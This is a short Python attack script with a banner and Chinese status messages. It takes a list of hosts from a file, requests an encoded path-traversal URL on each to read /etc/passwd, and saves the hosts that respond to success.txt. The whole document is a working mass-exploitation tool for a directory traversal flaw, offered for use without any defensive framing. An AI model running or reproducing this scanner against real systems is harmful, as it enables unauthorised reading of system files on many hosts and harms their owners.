import argparse
import contextlib

import requests

print('''
 _    _____                                     
| |__|___ / _ __   __ _ _   _  __ _ _ __   __ _ 
| '_ \ |_ \| '_ \ / _` | | | |/ _` | '_ \ / _` |
| |_) |__) | | | | (_| | |_| | (_| | | | | (_| |
|_.__/____/|_| |_|\__, |\__,_|\__,_|_| |_|\__, |
                  |___/                   |___/ 
脚本，启动！！！！
''')

parser = argparse.ArgumentParser()
parser.add_argument('-f', type=str, default=None, required=True,
                    help='输入文件路径')
args = parser.parse_args()

with open(args.f, 'r') as f:
    lines = f.readlines()
    urls = [line.strip() for line in lines if not line.startswith('https')]

success_targets = []

for url in urls:
    target = f'http://{url}/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
    with contextlib.suppress(requests.exceptions.RequestException):
        response = requests.get(url=target, timeout=5)
        if 'root' in response.text:
            success_targets.append(target)
            print('成功了捏')
        else:
            print('失败了捏')
with open('success.txt', 'w') as f:
    for target in success_targets:
        f.write(target + '\n')
